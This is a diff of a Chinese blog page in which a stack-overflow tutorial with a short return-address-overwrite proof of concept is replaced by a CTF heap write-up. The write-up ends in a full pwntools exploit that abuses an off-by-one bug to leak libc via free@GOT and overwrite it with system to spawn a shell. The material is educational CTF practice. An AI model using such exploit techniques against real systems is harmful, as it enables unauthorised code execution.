@@ -17,7 +17,7 @@
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://1t01x1w4.github.io';</script>
   
   <title>
-    栈溢出 |
+    记一道pwn入门堆题 off-by-one |
     
     淋着雨
   </title>
@@ -35,26 +35,29 @@
 
   
   
-    <meta name="description" content="程序运行时，每个进程都会分配一块独立的栈空间（Stack），用于保存函数调用时的局部变量、函数参数以及返回地址等。栈的特点如下：  栈从高地址向低地址生长。 函数调用时形成一个栈帧（Stack Frame）。 向栈中写入数据是按低地址到高地址的方向。  函数调用时栈的变化32位架构下的寄存器包括eax、ebx、esp、ebp等；64位架构下的寄存器名称略有不同，包括rdi、rsi、rdx、rbp等">
+    <meta name="description" content="之前开始学堆时练手的新手题感觉对我个人来说还是太难了，导致我一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，极大提高了我的自信心。 程序分析checksec查看开启的保护信息：部分RELRO、canary以及堆栈不可执行。  程序逻辑题目给出了libc文件，所以先用pwninit以及patchelf对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="栈溢出">
-<meta property="og:url" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:title" content="记一道pwn入门堆题 off-by-one">
+<meta property="og:url" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/index.html">
 <meta property="og:site_name" content="淋着雨">
-<meta property="og:description" content="程序运行时，每个进程都会分配一块独立的栈空间（Stack），用于保存函数调用时的局部变量、函数参数以及返回地址等。栈的特点如下：  栈从高地址向低地址生长。 函数调用时形成一个栈帧（Stack Frame）。 向栈中写入数据是按低地址到高地址的方向。  函数调用时栈的变化32位架构下的寄存器包括eax、ebx、esp、ebp等；64位架构下的寄存器名称略有不同，包括rdi、rsi、rdx、rbp等">
+<meta property="og:description" content="之前开始学堆时练手的新手题感觉对我个人来说还是太难了，导致我一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，极大提高了我的自信心。 程序分析checksec查看开启的保护信息：部分RELRO、canary以及堆栈不可执行。  程序逻辑题目给出了libc文件，所以先用pwninit以及patchelf对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image1.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image2.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image3.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image5.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image4.png">
-<meta property="og:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image6.png">
-<meta property="article:published_time" content="2026-02-14T14:16:02.000Z">
-<meta property="article:modified_time" content="2026-04-07T11:12:15.815Z">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image1.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image2.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image3.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image4.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image5.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image6.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image7.png">
+<meta property="og:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image8.png">
+<meta property="article:published_time" content="2026-06-11T06:02:43.000Z">
+<meta property="article:modified_time" content="2026-06-11T07:33:22.110Z">
 <meta property="article:author" content="淋着雨">
-<meta property="article:tag" content="pwn">
-<meta property="article:tag" content="stack">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="of-by-one">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/image1.png">
+<meta name="twitter:image" content="http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/image1.png">
   
   
   
@@ -186,7 +189,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/bannner.webp" alt="栈溢出">
+          <img  fetchpriority="high" src="/images/bannner.webp" alt="记一道pwn入门堆题 off-by-one">
         
       
     
@@ -197,7 +200,7 @@
         
         
           <span id="logo">
-            <h1 data-aos="slide-up">栈溢出</h1>
+            <h1 data-aos="slide-up">记一道pwn入门堆题 off-by-one</h1>
           </span>
         
       
@@ -227,7 +230,7 @@
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
   
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">函数调用时栈的变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">栈溢出的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0poc"><span class="toc-number">3.2.</span> <span class="toc-text">构造poc</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-number">1.2.</span> <span class="toc-text">程序逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ida%E4%BC%AA%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">ida伪代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">3.</span> <span class="toc-text">完整exp</span></a></li></ol>
   
 </div>
 </div>
@@ -310,13 +313,13 @@
   
 </aside>
 
-          <section id="main"><article id="post-栈溢出" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-记一道pwn入门堆题-off-by-one" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
-    <time datetime="2026-02-14T14:16:02.000Z" itemprop="datePublished">2026-02-14</time>
-    <time style="display: none;" id="post-update-time">2026-04-07</time>
+    <time datetime="2026-06-11T06:02:43.000Z" itemprop="datePublished">2026-06-11</time>
+    <time style="display: none;" id="post-update-time">2026-06-11</time>
   </span>
   
 </div>
@@ -335,33 +338,28 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <p>程序运行时，每个进程都会分配一块独立的栈空间（Stack），用于保存函数调用时的局部变量、函数参数以及返回地址等。栈的特点如下：</p>
-<ol>
-<li>栈从高地址向低地址生长。</li>
-<li>函数调用时形成一个栈帧（Stack Frame）。</li>
-<li>向栈中写入数据是按低地址到高地址的方向。</li>
-</ol>
-<h2 id="函数调用时栈的变化"><a href="#函数调用时栈的变化" class="headerlink" title="函数调用时栈的变化"></a>函数调用时栈的变化</h2><p>32位架构下的寄存器包括eax、ebx、esp、ebp等；64位架构下的寄存器名称略有不同，包括rdi、rsi、rdx、rbp等。</p>
-<p>下面用几条汇编指令来展开。</p>
-<ol>
-<li>“call &lt;被调函数&gt;”，这条指令相当于“push ret_addr”和“jmp”，即向栈中压入返回地址然后跳转到被调函数，压入的返回地址用于被调函数执行结束后跳转到调用处的下一条指令。</li>
-<li>“push ebp”，向栈中压入主调函数的帧基指针（ebp），方便被调函数执行后恢复原来的栈结构。</li>
-<li>“mov ebp, esp”，将ebp指向当前栈顶指针（esp），可以看作形成一个新的栈帧。</li>
-<li>“sub esp, &lt;立即数&gt;”，esp向低地址开辟&lt;立即数&gt;个字节的内存空间。</li>
-</ol>
-<p><img src="image1.png" alt="函数调用栈示意图"></p>
-<h2 id="栈溢出的原因"><a href="#栈溢出的原因" class="headerlink" title="栈溢出的原因"></a>栈溢出的原因</h2><p>了解了栈的特点以及函数调用时栈的变化，可以知道被调函数执行结束后程序执行的下一条指令的地址是由压入的返回地址决定的。由于局部变量通常存放在栈上，如果程序使用了不安全的输入函数（如 gets()），没有对输入长度进行限制，就有可能出现用户输入的数据超过了局部变量所分配的栈空间，超出的数据往高地址继续写入从而覆盖相邻栈空间上的数据。</p>
-<p>如果程序中存在后门函数或者攻击者已经控制了某个地址，攻击者计算好输入点到返回地址的距离（也就是偏移量offset），构造payload使得可控制地址恰好在返回地址处发送给程序，就实现了任意代码执行，这便是栈溢出漏洞。</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这里以BUUCTF上的一道入门题“rip”为例。</p>
-<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>查看程序保护信息，是一个64位程序，且没有任何保护。用ida打开，查看main函数，可以看到，定义了一个变量s，距离栈底0xF也就是15字节；同时发现存在危险输入函数gets()，用来给s赋值。</p>
-<p><img src="image2.png" alt="main函数"></p>
-<p>翻阅左边的段表，有一个可疑函数fun()，果不其然是一个后门函数。查看后门函数地址。</p>
-<p><img src="image3.png" alt="后门函数"></p>
-<p><img src="image5.png" alt="后门函数地址"></p>
-<p>查看汇编代码，可以看到有压栈操作，所以填充完s后还需要再覆盖rbp。需要注意的是，64位架构下，调用system()时如果堆栈不平衡会报错，所以我们需要在调用后门函数前添加一个“ret”地址来平衡堆栈（在配置了ROPgadget的Linux系统中执行“ROPgadget –binary &lt;ELF文件&gt; only “ret””查找elf文件中的ret片段）。</p>
-<p><img src="image4.png" alt="push rbp"></p>
-<p><img src="image6.png" alt="ret地址"></p>
-<h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#pwntool是python中一个用来编写pwn攻击脚本的库</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./&lt;ELF文件&gt;&quot;</span>)  <span class="comment">#打本地</span></span><br><span class="line">r = remote(<span class="string">&quot;IP&quot;</span>，port)  <span class="comment">#打远程靶机</span></span><br><span class="line"></span><br><span class="line">fun = <span class="number">0x401186</span>  <span class="comment">#后门函数地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xF</span> + <span class="number">8</span>) + p64(fun)  </span><br><span class="line"></span><br><span class="line">p.sendline(payload)  <span class="comment">#发送payload并换行</span></span><br><span class="line">p.interactive()  <span class="comment">#切换为交互模式，相当于在Linux系统shell中执行“nc IP port”</span></span><br></pre></td></tr></table></figure>
+        <p>之前开始学堆时练手的新手题感觉对我个人来说还是太难了，导致我一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，极大提高了我的自信心。</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>查看开启的保护信息：部分RELRO、canary以及堆栈不可执行。</p>
+<p><img src="image1.png" alt="checksec"></p>
+<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>题目给出了libc文件，所以先用pwninit以及patchelf对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，可以看到是普通菜单题，提供增删改查操作。</p>
+<p><img src="image2.png" alt="运行程序"></p>
+<h3 id="ida伪代码分析"><a href="#ida伪代码分析" class="headerlink" title="ida伪代码分析"></a>ida伪代码分析</h3><p>main函数负责调用菜单函数以及各个操作函数，跟进操作函数进行分析。其中引起注意的是create_heap函数以及edit_heap函数。</p>
+<p>cerate_heap ：维护一个heaparray数组，申请堆块时遍历数组找到第一个为空的位置；每次申请堆块时都会固定先申请一个0x20大小的堆块作为“管理块”，接着再申请用户所申请大小的堆块作为“数据块”。其中，“v0&#x3D; (__int64)<em>(&amp;heaparray + n9)”将“管理块”地址转为整数赋给v0；“</em>(QWORD <em>)(v0 + 8) &#x3D; malloc(size)”将管理块偏移量为8的地址用来存放“数据块”的数据指针；“</em>(QWORD <em>)</em>(&amp;heaparray + n9) &#x3D; size”将“管理块”起始的8字节用来存放“数据块”的size。</p>
+<p><img src="image3.png" alt="create_heap"></p>
+<p>例如申请一个0x10大小的堆块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> --------------------------------------</span><br><span class="line">|    pre_size   |        0x10          |      &lt;---管理块</span><br><span class="line"> --------------------------------------</span><br><span class="line">|   data_size   | *data(指向user_data) |</span><br><span class="line"> --------------------------------------</span><br><span class="line">|   pre_size    |        0x10          |      &lt;---数据块</span><br><span class="line"> --------------------------------------</span><br><span class="line">|              user_data               | </span><br><span class="line"> --------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>在edit_heap函数中注意到“read_input(*((_QWORD <em>)</em>(&amp;heaparray + n0xA) + 1), *(_QWORD <em>)</em>(&amp;heaparray + n0xA) + 1LL)”，正常向堆块中写入内容的大小应该是size，而这里多出了“1LL”，典型的off-by-one，利用这个我们就能够通过溢出的字节修改下一个相邻堆块的大小。</p>
+<p><img src="image4.png" alt="edit_heap"></p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>申请一个0x38大小的chunk0以及0x10大小的chunk1，注意此处申请的chunk0大小必须是“0xX8”，如果申请的是“0xX0”大小的话溢出修改到的就不是下一个相邻chunk的size而是pre_size了；往chunk0中写入以“&#x2F;bin&#x2F;sh\x00”开头的38字节内容加上“\x41”。</p>
+<p><img src="image5.png" alt="溢出"></p>
+<p>通过gdb调试，可以看到此时chunk1的“管理块”大小已经被修改为了0x41，而“数据块”被“包含”在了我们所伪造的“管理块”中。</p>
+<p><img src="image6.png" alt="调试1"></p>
+<p>接下来我们释放掉chunk1，伪造的“管理块”以及原来的“数据块”都一同被放进了fastbin中。此时我们申请一个0x30大小的chunk，glibc会先从fastbin中取出原来chunk1的“数据块”作为新的chunk1的“管理块”，再从fastbin中取出伪造的0x41的“管理块”作为新的chunk1的“数据块”；申请的时候往chunk中偏移刚好为数据指针的地址写入free@GOT，借助show_heap函数将free@GOT打印出来，用来计算libc基址，这就和之前的ret2libc很像了。</p>
+<p><img src="image7.png" alt="二次申请"></p>
+<p><img src="image8.png" alt="调试2"></p>
+<p>最后需要做的就是用libc基址计算system函数地址，写入chunk1“管理块”的free@GOT，使得调用free函数变为调用system函数。</p>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;&quot;, )</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x38</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment"># chunk0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;aaaa&#x27;</span>)  <span class="comment"># chunk1</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + <span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(free_got)</span><br><span class="line">create(<span class="number">0x30</span>, payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">payload = p64(sys_addr)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     <footer class="article-footer">
@@ -374,7 +372,7 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="../../../../tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="../../../../tags/stack/" rel="tag">stack</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="../../../../tags/ROP/" rel="tag">ROP</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="../../../../tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="../../../../tags/of-by-one/" rel="tag">of-by-one</a></li></ul>
 
 
     </footer>
@@ -382,23 +380,23 @@
   
   <nav id="article-nav" data-aos="fade-up">
     
-      
-      <div class="article-nav-link-wrap left">
-        
-          
-          
-            <img data-src="/covers/【哲风壁纸】jk-动漫-动漫壁纸.png" data-sizes="auto" alt="ret2shellcode" class="lazyload">
-          
-        
-        <a href="/2026/02/15/ret2shellcode/"></a>
-        <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">
-          
-            ret2shellcode
-          
-        </h3>
-      </div>
     
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/【哲风壁纸】原神-芙芙.png" data-sizes="auto" alt="Earth靶机渗透" class="lazyload">
+        
+      
+      <a href="/2026/04/30/Earth%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          Earth靶机渗透
+        
+      </h3>
+    </div>
     
   </nav>
 
@@ -503,7 +501,7 @@
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
   
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">函数调用时栈的变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">栈溢出的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0poc"><span class="toc-number">3.2.</span> <span class="toc-text">构造poc</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-number">1.2.</span> <span class="toc-text">程序逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ida%E4%BC%AA%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">ida伪代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">3.</span> <span class="toc-text">完整exp</span></a></li></ol>
   
 </div>
 </div>
@@ -649,13 +647,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "淋着雨",
-          title: "栈溢出",
-          url: "http://1t01x1w4.github.io/2026/02/14/%E6%A0%88%E6%BA%A2%E5%87%BA/",
+          title: "记一道pwn入门堆题 off-by-one",
+          url: "http://1t01x1w4.github.io/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/",
           excerpt: "",
           description: "",
-          stripContent: "程序运行时，每个进程都会分配一块独立的栈空间（Stack），用于保存函数调用时的局部变量、函数参数以及返回地址等。栈的特点如下：  栈从高地址向低地址生长。 函数调用时形成一个栈帧（Stack Frame）。 向栈中写入数据是按低地址到高地址的方向。  函数调用时栈的变化32位架构下的寄存器包括eax、ebx、esp、ebp等；64位架构下的寄存器名称略有不同，包括rdi、rsi、rdx、rbp等。 下面用几条汇编指令来展开。  “call &amp;lt;被调函数&amp;gt;”，这条指令相当于“push ",
-          date: "Sat Feb 14 2026 22:16:02 GMT+0800",
-          updated: "Tue Apr 07 2026 19:12:15 GMT+0800",
+          stripContent: "之前开始学堆时练手的新手题感觉对我个人来说还是太难了，导致我一度暂停了对堆的进一步学习。最近学院办了场比赛，其中这道入门堆题对我来说火候刚好，极大提高了我的自信心。 程序分析checksec查看开启的保护信息：部分RELRO、canary以及堆栈不可执行。  程序逻辑题目给出了libc文件，所以先用pwninit以及patchelf对程序的链接进行设置，确保和远程的环境一致。先运行程序，了解程序的大体逻辑，可以看到是普通菜单题，提供增删改查操作。  ida伪代码分析main函数负责调用菜单函数以",
